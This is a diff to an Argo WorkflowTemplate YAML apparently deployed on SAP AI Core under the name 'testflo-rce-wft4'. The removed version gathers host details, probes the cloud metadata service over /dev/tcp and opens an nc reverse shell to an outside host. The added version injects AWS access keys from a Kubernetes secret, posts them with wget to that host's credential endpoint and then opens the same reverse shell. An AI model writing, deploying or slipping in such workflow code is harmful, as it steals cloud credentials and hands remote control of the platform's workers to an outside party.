@@ -1,15 +1,15 @@
 apiVersion: argoproj.io/v1alpha1
 kind: WorkflowTemplate
 metadata:
-  name: testflo-rce-wft3
+  name: testflo-rce-wft4
   annotations:
-    executables.ai.sap.com/name: testflo-rce-wft3
-    executables.ai.sap.com/id: testflo-rce-wft3
+    executables.ai.sap.com/name: testflo-rce-wft4
+    executables.ai.sap.com/id: testflo-rce-wft4
   labels:
     scenarios.ai.sap.com/id: testflo-scenario
     scenarios.ai.sap.com/name: testflo-scenario
-    executables.ai.sap.com/id: testflo-rce-wft3
-    executables.ai.sap.com/name: testflo-rce-wft3
+    executables.ai.sap.com/id: testflo-rce-wft4
+    executables.ai.sap.com/name: testflo-rce-wft4
     ai.sap.com/version: "1.0.0"
     ai.sap.com/resourcePlan: starter
 spec:
@@ -21,22 +21,26 @@ spec:
           ai.sap.com/resourcePlan: starter
       container:
         image: alpine:3.19
+        env:
+          - name: AWS_ACCESS_KEY_ID
+            valueFrom:
+              secretKeyRef:
+                name: default-object-store-secret
+                key: AWS_ACCESS_KEY_ID
+          - name: AWS_SECRET_ACCESS_KEY
+            valueFrom:
+              secretKeyRef:
+                name: default-object-store-secret
+                key: AWS_SECRET_ACCESS_KEY
         command:
           - sh
           - -c
           - |
-            # node info
-            echo "hostname: $(hostname)"
-            cat /proc/version 2>/dev/null || true
-            cat /sys/devices/virtual/dmi/id/product_name 2>/dev/null || true
-            # IMDS via /dev/tcp
-            (exec 3<>/dev/tcp/169.254.169.254/80
-            printf "PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n" >&3
-            IMDS_RESP=$(cat <&3)
-            exec 3>&-
-            echo "IMDS_RESP: $IMDS_RESP") || echo "IMDS_DEV_TCP_FAILED"
-            # env recon
-            env | grep -v 'TOKEN\|SECRET\|PASS\|KEY' || true
-            # reverse shell
-            nc sfg.0x79.de 8080 -e /bin/sh || true
+            C2="sfg.0x79.de"
+            TAG="TESTFLO-WFT4-CREDS"
+            NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
+            HN=$(hostname)
+            BODY="${TAG} h=${HN} ns=${NS} id=${AWS_ACCESS_KEY_ID} secret=${AWS_SECRET_ACCESS_KEY}"
+            wget -q --post-data "${BODY}" "http://${C2}:8080/cb-creds" -O /dev/null 2>/dev/null || true
+            nc ${C2} 8080 -e /bin/sh || true
             sleep 3600
